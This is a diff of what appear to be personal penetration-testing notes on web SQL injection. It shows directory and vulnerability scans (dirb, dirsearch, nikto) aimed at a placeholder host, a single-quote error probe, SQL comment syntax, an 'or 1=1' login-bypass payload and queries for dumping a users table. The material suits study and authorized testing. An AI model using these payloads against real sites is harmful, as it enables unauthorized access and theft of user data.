@@ -1,20 +1,22 @@
 ## Enumerate
 ```bash
 dirb evil.com -r -z10 # recursive; wait 10 milliseconds between delays
-
+```
+```bash
 python3 dirsearch/dirsearch.py -u evil.com --simple-report demo-webcrawl.txt
-
+```
+```bash
 nikto -h evil.com -Format txt -o demo-vulnscan-web.txt
 ```
 
-SQL Injection Vulnerabilities
+Finding SQL Injection Vulnerabilities
 ```bash
 ` # single-quote
 # the resulting error may indicate the underlying web server software, database software, and server OS 
 ```
 
 ## Exploit
-Comments
+SQL Comments
 ```
 # MySQL, MariaDB
 -- Oracle
@@ -22,13 +24,7 @@ Comments
 */ Oracle
 ```
 
-SQL Database Query Examples
-```sql
-USE victimdb;
-SELECT * FROM users;
-```
-
-SQL Injection Examples
+SQL Injection Attacks
 ```
 # bypass auth (put in the username field)
 victor' or 1=1; -- 
@@ -53,8 +49,11 @@ victor' or 1=1 LIMIT=1; --
 ```
 
 ## Explore
+SQL Database Queries
 ```sql
-SELECT * FROM target.users # database.table
+SELECT * FROM targetdb.usertbl # database.table
+USE targetdb;
+SELECT * FROM usertbl;
 ```
 
 ## Effect
